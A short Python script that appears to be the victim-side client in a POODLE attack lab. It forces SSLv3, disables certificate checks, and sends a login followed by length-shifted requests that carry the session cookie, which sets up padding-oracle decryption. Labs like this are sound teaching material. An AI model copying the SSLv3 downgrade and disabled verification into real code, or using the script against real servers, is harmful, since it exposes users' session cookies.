import requests
from scapy.all import *
import sys
import os
import ssl
import time
import json
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
# from attacker import run_script


requests.packages.urllib3.disable_warnings() 

class SSL3Adapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_version'] = ssl.PROTOCOL_SSLv3
        return super(SSL3Adapter, self).init_poolmanager(*args, **kwargs)

session = requests.Session()
session.mount('https://', SSL3Adapter())

time.sleep(3)
response = session.post(url="https://poodle_container/login?username=victim&password=12345", \
                        headers={"Content-Type":"application/json", "Connection":"keep-alive"}, \
                        verify=False)
cookie = response.text
time.sleep(3)
print(cookie)

for i in range(16):
    time.sleep(1)
    response = session.post(url="https://poodle_container/" + "a" * i, \
                headers={"Content-Type":"application/json", "Connection":"keep-alive"}, \
                data={"data": "a" * (16 - i)}, \
                cookies={"sessioncookie": cookie}, \
                verify=False)
